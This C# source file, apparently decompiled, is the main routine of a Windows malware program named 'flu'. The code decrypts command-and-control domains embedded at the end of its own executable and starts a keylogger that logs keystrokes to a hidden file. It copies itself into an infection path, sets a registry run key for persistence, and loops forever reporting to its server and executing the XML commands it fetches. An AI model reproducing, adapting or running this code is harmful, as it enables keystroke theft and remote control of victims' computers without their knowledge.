using System;
using System.IO;
using System.Net.NetworkInformation;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace flu;

internal static class Program
{
	[STAThread]
	private static void Main()
	{
		XMLReader xMLReader = new XMLReader();
		StreamReader streamReader = new StreamReader(Application.get_ExecutablePath());
		BinaryReader binaryReader = new BinaryReader(streamReader.BaseStream);
		byte[] array = binaryReader.ReadBytes(Convert.ToInt32(streamReader.BaseStream.Length));
		binaryReader.Close();
		streamReader.Close();
		int num = Encoding.ASCII.GetString(array).IndexOf("-||-");
		string @string = Encoding.ASCII.GetString(array, num, array.Length - num);
		@string = @string.Replace("-||-", "");
		string[] array2 = @string.Split(new char[1] { '¬' });
		string[] array3 = Crypto.DecryptDomains(array2[0]).Split(new char[1] { '¬' });
		try
		{
			Network.XML = array3[1];
		}
		catch
		{
		}
		try
		{
			Network.Domain = array3[0];
		}
		catch
		{
		}
		try
		{
			Network.MAC = NetworkInterface.GetAllNetworkInterfaces()[0].GetPhysicalAddress().ToString();
		}
		catch
		{
		}
		try
		{
			File file = new File(Application.get_ExecutablePath());
			string text = string.Empty;
			string empty = string.Empty;
			bool flag;
			if (!(flag = file.existKey("win32")))
			{
				text = Path.GetRandomFileName().Replace(".", "");
				empty = OS.InfectionPath() + "\\" + text + ".txt";
			}
			else
			{
				empty = file.getKeyValue("win32").Replace(".exe", ".txt");
			}
			try
			{
				KeyLogger keyLogger = new KeyLogger(empty);
				keyLogger.FlushInterval = Convert.ToDouble(15000);
				keyLogger.Enabled = true;
				StreamWriter streamWriter = new StreamWriter(empty, append: true);
				streamWriter.WriteLine("Teclas pulsadas por el usuario:\r\n");
				streamWriter.Close();
				File file2 = new File(empty);
				file2.Protect();
			}
			catch
			{
			}
			if (!flag)
			{
				try
				{
					file.Protect();
					empty = OS.InfectionPath() + "\\" + text + ".exe";
					file.CopyTo(empty);
					file = new File(empty);
					file.Register(File.RunLocation.InRegistry);
					file.Protect();
				}
				catch
				{
				}
			}
		}
		catch
		{
		}
		while (true)
		{
			try
			{
				while (true)
				{
					if (Network.Online())
					{
						try
						{
							Network.UpdateState(OS.Version());
						}
						catch
						{
						}
						try
						{
							xMLReader.GetXML();
						}
						catch
						{
						}
						try
						{
							xMLReader.ExecuteXML();
						}
						catch
						{
							System.Console.WriteLine("Error no hay XML cargado");
						}
					}
					try
					{
						Thread.Sleep(2000);
					}
					catch
					{
					}
				}
			}
			catch
			{
			}
		}
	}
}
